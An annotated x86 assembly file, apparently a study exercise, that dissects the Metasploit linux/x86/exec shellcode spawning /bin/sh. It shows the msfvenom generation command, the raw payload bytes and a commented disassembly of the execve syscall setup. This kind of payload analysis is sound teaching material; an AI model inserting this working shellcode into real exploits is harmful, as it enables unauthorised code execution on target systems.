; Generated from msfvenom:
; ▶  msfvenom --arch x86 --platform linux -p linux/x86/exec CMD=sh -f sh
; No encoder specified, outputting raw payload
; Payload size: 38 bytes
; Final size of sh file: 179 bytes
; export buf=\
; $'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73'\
; $'\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00'\
; $'\x00\x73\x68\x00\x57\x53\x89\xe1\xcd\x80'
; echo -ne $buf | ndisasm -u - > msf_exec_sh.nasm
;
; one-liner: \x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x73\x68\x00\x57\x53\x89\xe1\xcd\x80

global _start

section .text

_start:
push byte +0xb          ; 00000000  6A0B
pop eax                 ; 00000002  58          ; execve(2)
cdq                     ; 00000003  99          ; clear edx
push edx                ; 00000004  52          ; push NULL
push word 0x632d        ; 00000005  66682D63    ; push '-c'
mov edi,esp             ; 00000009  89E7        ; edi = '-c' address in stack
push dword 0x68732f     ; 0000000B  682F736800  ; push '/sh', esp = '/sh'
push dword 0x6e69622f   ; 00000010  682F62696E  ; push '/bin', esp = '/bin/sh'
mov ebx,esp             ; 00000015  89E3        ; ebx = esp_address
push edx                ; 00000017  52          ; push NULL
call 0x20               ; 00000018  E803000000  ; jump to 0x20 and push next instruction's address into stack
jnc 0x87                ; 0000001D  7368        ; equivalent to "sh"
                                                ; using gdb, 0x20 is: push edi; push ebx
add [edi+0x53],dl       ; 0000001F  005753      ; esp = "/bin/sh -c sh"
mov ecx,esp             ; 00000022  89E1        ; ecx = esp_address
int 0x80                ; 00000024  CD80        ; syscall execve(first_binsh_addr, second_binsh_addr, NULL)
